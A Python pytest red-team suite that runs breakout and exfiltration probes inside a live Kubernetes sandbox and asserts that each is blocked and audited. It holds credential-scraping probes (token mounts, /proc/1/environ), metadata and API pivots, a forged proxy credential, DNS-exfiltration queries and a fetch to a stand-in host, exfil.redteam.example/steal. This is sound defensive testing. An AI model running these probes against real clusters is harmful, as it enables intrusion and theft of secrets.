"""The red-team suite against the live sandbox backend: attacks run inside
a real provisioned sandbox on the cluster, not against OPA decisions on
paper.

What this suite claims, and what it deliberately does not:

- **Claimed and asserted here** — the containment posture: K8s
  Jobs + NetworkPolicy + resource caps. No credential to scrape, no
  Kubernetes API or node metadata to reach, no container-runtime socket or
  host mount, no other tenant's processes, run-scoped egress identity that
  cannot be forged, resource caps that actually terminate a runaway, and a
  wall-clock deadline on every Job.
- **Explicitly NOT claimed** — kernel-level isolation. Not hardened: there
  is no gVisor/Kata RuntimeClass, so the container's own privilege
  boundary is not a security boundary here.
  `test_root_inside_the_sandbox_buys_nothing` states that honestly: the
  containment is that privilege inside the sandbox reaches nothing, not
  that privilege is unavailable.

One residual risk this suite measures rather than prevents:
`sandbox.exec` is inside the executor's compiled scope by design, so
payload *attempts* are stopped by the egress layer rather than by the tool
allow-list (asserted in test_injected_conductor).

The baseline egress path — allowlisted host allowed, non-allowlisted host
denied and audited, NetworkPolicy backstop, revocation on unregistration —
is proven by test_egress; this suite adds the attacker-shaped variants.
"""

import contextlib
import io
import json
import subprocess
import tarfile
import time

import pytest

from common.ids import new_run_id
from sandbox.backends.k8s_jobs import K8sJobsBackend
from sandbox.backends.k8s_jobs.manifest import job_name
from sandbox.contract import SandboxPolicy
from sandbox.egressproxy.credentials import mint, sandbox_proxy_env

from .conftest import COMPANY_NS, PLATFORM_NS, audit_story, sandbox_image
from .test_egress import PROXY_URL, _admin, egress_key  # noqa: F401

GIT_ENV = {
    "GIT_AUTHOR_NAME": "test",
    "GIT_AUTHOR_EMAIL": "test@example.com",
    "GIT_COMMITTER_NAME": "test",
    "GIT_COMMITTER_EMAIL": "test@example.com",
    "HOME": "/nonexistent",
}


def _kubectl(*args: str) -> str:
    proc = subprocess.run(
        ["kubectl", *args], capture_output=True, text=True, timeout=60
    )
    assert proc.returncode == 0, proc.stderr
    return proc.stdout.strip()


@pytest.fixture(scope="module")
def workspace_tar(tmp_path_factory) -> bytes:
    path = tmp_path_factory.mktemp("redteam-ws")
    subprocess.run(["git", "init", "-b", "main"], cwd=path, env=GIT_ENV,
                   check=True, capture_output=True)
    (path / "secret-looking.txt").write_text("nothing to see\n")
    subprocess.run(["git", "add", "-A"], cwd=path, env=GIT_ENV,
                   check=True, capture_output=True)
    subprocess.run(["git", "commit", "-m", "base"], cwd=path, env=GIT_ENV,
                   check=True, capture_output=True)
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        for entry in path.iterdir():
            tar.add(entry, arcname=entry.name)
    return buf.getvalue()


class Target:
    """A live, registered sandbox plus a way to run attacker code in it."""

    def __init__(self, backend: K8sJobsBackend, handle, run_id: str) -> None:
        self.backend = backend
        self.handle = handle
        self.run_id = run_id

    def sh(self, script: str) -> tuple[int, str]:
        return self.backend._exec(self.handle.pod_name, ["sh", "-c", script])

    def py(self, script: str) -> tuple[int, str]:
        return self.backend._exec(self.handle.pod_name, ["python", "-c", script])


@pytest.fixture(scope="module")
def target(stack: None, env: dict, egress_key: str, workspace_tar: bytes):  # noqa: F811
    """One sandbox for the whole suite, provisioned and registered exactly
    as the orchestrator does it (registration is what gives the run its
    egress allowlist)."""
    backend = K8sJobsBackend(namespace=COMPANY_NS)
    run_id = new_run_id()
    handle = backend.provision(
        run_id,
        workspace_tar,
        SandboxPolicy(
            image=sandbox_image(),
            cpu="500m",
            memory="512Mi",
            env=sandbox_proxy_env(PROXY_URL, egress_key, run_id),
        ),
    )
    _admin(env, "register", run_id, handle)
    try:
        yield Target(backend, handle, run_id)
    finally:
        with contextlib.suppress(Exception):
            _admin(env, "unregister", run_id)
        backend.destroy(handle)


# --- the control every "blocked" assertion below depends on -------------------


def test_the_one_permitted_route_out_still_works(target: Target) -> None:
    """The control for this whole suite: the sandbox's network stack is
    live and its *permitted* egress — the audited proxy — answers. Without
    this, every "blocked" assertion below would also pass on a sandbox with
    no networking at all, and the suite would prove nothing."""
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(10)\n"
        f"rc = s.connect_ex(('egress-proxy.{PLATFORM_NS}.svc.cluster.local', 3128))\n"
        "print('connect_ex', rc)\n"
        "sys.exit(0 if rc == 0 else 1)"
    )
    assert exit_code == 0, (
        f"the sandbox cannot reach its own egress proxy: {output}"
    )


# --- secret scraping ----------------------------------------------------------


def test_no_service_account_token_is_mounted(target: Target) -> None:
    """`automountServiceAccountToken: False` on the Job: the sandbox
    holds no Kubernetes identity at all, so there is nothing to steal and
    nothing to replay against the API server."""
    exit_code, output = target.sh(
        "ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1; echo rc=$?"
    )
    # The probe must have actually reported, or "no token" would be the
    # vacuous reading of a probe that never ran.
    assert "rc=" in output, f"the probe did not run: {output!r}"
    assert "rc=0" not in output, f"a service-account token is mounted: {output}"


def test_the_kubernetes_api_is_unreachable(target: Target) -> None:
    """Even with a token, there would be no route: the sandbox
    NetworkPolicy permits egress to the audited proxy and nothing else.
    Probed with a raw socket so the proxy env cannot mask the result."""
    cluster_ip = _kubectl("-n", "default", "get", "svc", "kubernetes",
                          "-o", "jsonpath={.spec.clusterIP}")
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(5)\n"
        f"sys.exit(0 if s.connect_ex(('{cluster_ip}', 443)) != 0 else 1)"
    )
    assert exit_code == 0, f"the API server answered the sandbox: {output}"


def test_node_metadata_endpoints_are_unreachable(target: Target) -> None:
    """The kubelet's authenticated port and the cloud metadata address —
    the two classic pivots out of a container — are both off the sandbox's
    permitted egress."""
    node_ip = _kubectl("get", "nodes", "-o",
                       "jsonpath={.items[0].status.addresses[?(@.type=='InternalIP')].address}")
    probes = [(node_ip, 10250), ("169.254.169.254", 80)]
    for host, port in probes:
        exit_code, output = target.py(
            "import socket,sys\n"
            "s=socket.socket(); s.settimeout(5)\n"
            f"sys.exit(0 if s.connect_ex(('{host}', {port})) != 0 else 1)"
        )
        assert exit_code == 0, f"{host}:{port} answered the sandbox: {output}"


def test_the_only_credential_is_the_runs_own_scoped_proxy_secret(
    target: Target, egress_key: str,  # noqa: F811
) -> None:
    """The sandbox env carries exactly one secret-shaped value: its own
    per-run proxy credential. It is HMAC(key, run_id) — bound to this
    run, useless for any other, and worth nothing beyond the blueprint's
    allowlist."""
    exit_code, output = target.sh("printenv")
    assert exit_code == 0
    env = dict(
        line.split("=", 1) for line in output.splitlines() if "=" in line
    )

    expected = mint(egress_key, target.run_id)
    assert expected in env.get("HTTP_PROXY", ""), "proxy credential missing"
    assert target.run_id in env["HTTP_PROXY"], "credential is not run-scoped"

    # Nothing else token-shaped: same rule as the CI image gate, allowing
    # only the proxy vars and the blanked python-image GPG_KEY.
    proxy_vars = {"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"}
    leaked = [
        name for name, value in env.items()
        if (name.endswith("_TOKEN") or name.endswith("_KEY"))
        and name not in proxy_vars
        and value != ""
    ]
    assert not leaked, f"credential-shaped env in the sandbox: {leaked}"


def test_a_sandbox_cannot_forge_another_runs_egress_identity(
    target: Target, egress_key: str,  # noqa: F811
) -> None:
    """The credential is self-authenticating (username=run_id,
    password=HMAC(key, run_id)), so a sandbox that only ever sees its own
    cannot mint another run's. Claiming a foreign run id with our own
    secret is rejected 407 — and the failed attribution attempt is itself
    audited, under the *claimed* id."""
    victim_run = new_run_id()
    own_secret = mint(egress_key, target.run_id)
    exit_code, output = target.py(
        "import base64,socket,sys\n"
        f"cred = base64.b64encode(b'{victim_run}:{own_secret}').decode()\n"
        "s = socket.create_connection(('egress-proxy."
        f"{PLATFORM_NS}.svc.cluster.local', 3128), timeout=10)\n"
        "s.sendall(('CONNECT pypi.org:443 HTTP/1.1\\r\\n'\n"
        "          'Host: pypi.org:443\\r\\n'\n"
        "          'Proxy-Authorization: Basic ' + cred + '\\r\\n\\r\\n')"
        ".encode())\n"
        "print(s.recv(200).decode('latin-1').splitlines()[0])\n"
    )
    assert exit_code == 0, output
    assert "407" in output, f"forged identity was not rejected: {output}"

    # pypi.org IS allowlisted for the real run — so only the failed
    # authentication can explain the refusal, and it is on the record.
    denies: list = []
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        denies = [
            e for e in audit_story(victim_run)
            if e["decision"] == "deny" and e["rule"] == "egress_bad_credential"
        ]
        if denies:
            break
        time.sleep(1)
    assert denies, "the forged-identity attempt is missing from the audit store"
    assert denies[0]["source"] == "sandbox-infra"


# --- breakout -----------------------------------------------------------------


def test_no_container_runtime_socket_or_host_mount(target: Target) -> None:
    """Nothing of the host is handed to the sandbox: no runtime socket to
    drive, no host filesystem bind-mounted in. The Job manifest declares no
    volumes at all — this asserts the live pod matches."""
    for path in ("/var/run/docker.sock", "/run/containerd/containerd.sock",
                 "/var/run/crio/crio.sock", "/host", "/rootfs"):
        exit_code, output = target.sh(f"test -e {path}; echo rc=$?")
        assert "rc=" in output, f"the probe for {path} did not run: {output!r}"
        assert "rc=0" not in output, f"{path} exists inside the sandbox"

    # Control: the same probe shape reports rc=0 for a path that does exist,
    # so the five negatives above are evidence and not a broken command.
    _, control = target.sh("test -e /workspace; echo rc=$?")
    assert "rc=0" in control, f"probe shape is broken: {control!r}"

    exit_code, mounts = target.sh("cat /proc/mounts")
    assert exit_code == 0
    for suspicious in ("/var/lib/kubelet", "/var/lib/docker", "/etc/kubernetes"):
        assert suspicious not in mounts, f"host path {suspicious} is mounted"


def test_the_process_namespace_is_the_pods_own(target: Target) -> None:
    """No hostPID: the sandbox sees its own container's processes only —
    not the kubelet, not the runtime, not another tenant's workload (whose
    /proc/<pid>/environ would otherwise be readable)."""
    exit_code, output = target.py(
        "import os\n"
        "cmds=[]\n"
        "for pid in [p for p in os.listdir('/proc') if p.isdigit()]:\n"
        "    try:\n"
        "        cmds.append(open(f'/proc/{pid}/cmdline').read().replace(chr(0),' '))\n"
        "    except OSError:\n"
        "        pass\n"
        "print(len(cmds)); print('|'.join(cmds))"
    )
    assert exit_code == 0, output
    lines = output.strip().splitlines()
    count, joined = int(lines[0]), lines[1] if len(lines) > 1 else ""
    assert count < 25, f"the sandbox can see {count} processes — host PID namespace?"
    for foreign in ("kubelet", "containerd", "dockerd", "kube-apiserver"):
        assert foreign not in joined, f"host process visible from the sandbox: {foreign}"


def test_root_inside_the_sandbox_buys_nothing(target: Target) -> None:
    """The honest statement of the containment boundary: not hardened —
    there is no gVisor/Kata RuntimeClass, so the container's privilege
    boundary is not claimed as a security boundary. Containment is that
    privilege inside the sandbox reaches *nothing* — the assertions above
    (no token, no API, no metadata, no host mount, no foreign processes)
    hold regardless of uid, and egress stays confined to the audited proxy.

    This test pins the posture so a change in it is a visible decision:
    if the sandbox ever does run unprivileged, this is where that is
    recorded."""
    exit_code, output = target.py(
        "import os\n"
        "leaked = [\n"
        "    entry.split('=', 1)[0]\n"
        "    for entry in open('/proc/1/environ').read().split(chr(0))\n"
        "    if '=' in entry\n"
        "    for name, value in [entry.split('=', 1)]\n"
        "    if (name.endswith('_TOKEN') or name.endswith('_KEY')) and value\n"
        "]\n"
        "print(os.getuid()); print(leaked)"
    )
    assert exit_code == 0, output
    uid_line, leaked_line = output.strip().splitlines()[:2]

    # Whatever the uid, reading PID 1 gets the attacker nothing.
    assert leaked_line == "[]", f"PID 1 env leaked a credential: {leaked_line}"
    assert int(uid_line) in (0, 65532), f"unexpected sandbox uid {uid_line}"


# --- resource caps and the wall-clock deadline --------------------------------


def test_resource_caps_and_deadline_are_declared_on_the_live_job(
    target: Target,
) -> None:
    """The compiled policy reaches the cluster object, not just the
    manifest builder: CPU, memory and ephemeral-storage limits on the
    container, and a wall-clock deadline on the Job (whose enforcement is
    proven by test_sandbox_k8s's runaway test)."""
    spec = json.loads(_kubectl(
        "-n", COMPANY_NS, "get", "job", job_name(target.run_id), "-o", "json"
    ))
    assert spec["spec"]["activeDeadlineSeconds"] > 0
    pod_spec = spec["spec"]["template"]["spec"]
    assert pod_spec["automountServiceAccountToken"] is False
    limits = pod_spec["containers"][0]["resources"]["limits"]
    for capped in ("cpu", "memory", "ephemeral-storage"):
        assert limits.get(capped), f"no {capped} limit on the sandbox container"


def test_memory_cap_terminates_a_runaway_allocation(
    stack: None, egress_key: str, workspace_tar: bytes  # noqa: F811
) -> None:
    """Resource exhaustion, for real: caps demonstrably terminate a
    runaway workload. Runs in its own throwaway sandbox: the cgroup OOM
    killer picks the biggest process, and the shared target's toolserver
    must not be collateral.

    Deliberately NOT tested: fork bombs and disk-filling. Both are node-level
    denial of service on a single-node kind cluster — they would take the
    rest of the suite with them, which is a worse outcome than the gap."""
    backend = K8sJobsBackend(namespace=COMPANY_NS)
    run_id = new_run_id()
    handle = backend.provision(
        run_id,
        workspace_tar,
        SandboxPolicy(image=sandbox_image(), cpu="500m", memory="256Mi"),
    )
    try:
        exit_code, output = backend._exec(
            handle.pod_name,
            ["python", "-c",
             "b = bytearray(400 * 1024 * 1024)\n"
             "for i in range(0, len(b), 4096): b[i] = 1\n"
             "print('allocated')"],
        )
        # 137 = 128 + SIGKILL: the cgroup OOM killer, not an incidental
        # error. (The kill takes the container's task with it, which is
        # exactly why this runs in a sandbox of its own.)
        assert exit_code == 137, (
            f"expected an OOM kill (137), got {exit_code}: {output}"
        )
        assert "allocated" not in output
    finally:
        backend.destroy(handle)


# --- egress around the proxy --------------------------------------------------


def test_direct_external_tcp_is_dropped_by_the_backstop(target: Target) -> None:
    """Going around the proxy rather than through it: the NetworkPolicy
    drops it silently — the backstop *beneath* the audited layer, so
    absence of an audit event here is by design, not a gap."""
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(5)\n"
        "sys.exit(0 if s.connect_ex(('1.1.1.1', 443)) != 0 else 1)"
    )
    assert exit_code == 0, f"direct external TCP succeeded: {output}"


def test_no_dns_resolver_answers_the_sandbox(target: Target) -> None:
    """The sandbox has no DNS at all: neither an external resolver nor the
    cluster's own answers it.

    Cluster DNS is deliberately absent from the sandbox NetworkPolicy.
    CoreDNS forwards unknown names upstream, so a resolver the sandbox can
    reach is an exfiltration channel the audited proxy never sees — and
    the sandbox needs no resolver, because with an HTTP proxy the proxy
    resolves target hosts and the orchestrator resolves the proxy's own
    address at provision time.

    Both resolvers are probed by raw UDP so the proxy env cannot mask the
    result."""
    probe = (
        "import socket,sys\n"
        "header = bytes([0xab,0xcd, 1,0, 0,1, 0,0, 0,0, 0,0])\n"
        "name = b''.join(bytes([len(p)]) + p for p in "
        "(b'exfil', b'redteam', b'example')) + b'\\x00'\n"
        "query = header + name + bytes([0,1, 0,1])\n"
        "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)\n"
        "try:\n"
        "    s.sendto(query, ('{resolver}', 53)); s.recvfrom(512)\n"
        "    sys.exit(1)\n"
        "except Exception:\n"
        "    sys.exit(0)"
    )

    exit_code, output = target.py(probe.format(resolver="8.8.8.8"))
    assert exit_code == 0, f"an external DNS resolver answered: {output}"

    cluster_dns = _kubectl("-n", "kube-system", "get", "svc", "kube-dns",
                           "-o", "jsonpath={.spec.clusterIP}")
    exit_code, output = target.py(probe.format(resolver=cluster_dns))
    assert exit_code == 0, f"the cluster resolver answered: {output}"


def test_name_resolution_is_unavailable_in_the_sandbox(target: Target) -> None:
    """The consequence, stated positively: resolving any name fails, and
    the proxy env carries an address rather than a hostname — which is why
    egress through the audited proxy still works (proven by
    test_the_one_permitted_route_out_still_works)."""
    exit_code, output = target.py(
        "import socket,sys\n"
        "try:\n"
        "    socket.gethostbyname('pypi.org')\n"
        "    sys.exit(1)\n"
        "except OSError:\n"
        "    sys.exit(0)"
    )
    assert exit_code == 0, f"a name resolved inside the sandbox: {output}"

    exit_code, output = target.sh("printenv HTTPS_PROXY")
    assert exit_code == 0, output
    host = output.strip().rsplit("@", 1)[-1].rsplit(":", 1)[0]
    assert all(part.isdigit() for part in host.split(".")), (
        f"the proxy env carries a hostname, not an address: {host!r}"
    )


def test_every_blocked_attempt_that_has_a_source_is_in_the_audit_store(
    target: Target,
) -> None:
    """The mechanically-checkable half of the containment posture: where a
    source exists to see the block, the block is on the record. The proxy
    sees credential and allowlist denials; NetworkPolicy drops stay
    silent by design."""
    exit_code, output = target.py(
        "import urllib.request\n"
        "try:\n"
        "    urllib.request.urlopen('https://exfil.redteam.example/steal',"
        " timeout=15)\n"
        "except Exception as exc:\n"
        "    print(exc)"
    )
    assert exit_code == 0
    assert "403" in output, f"the proxy did not refuse the exfil host: {output}"

    denies: list = []
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline:
        denies = [
            e for e in audit_story(target.run_id)
            if e["decision"] == "deny" and e["rule"] == "egress_not_allowlisted"
        ]
        if denies:
            break
        time.sleep(1)
    assert denies, "a proxy deny left no audit event"
    assert denies[0]["source"] == "sandbox-infra"
    assert denies[0]["run_id"] == target.run_id
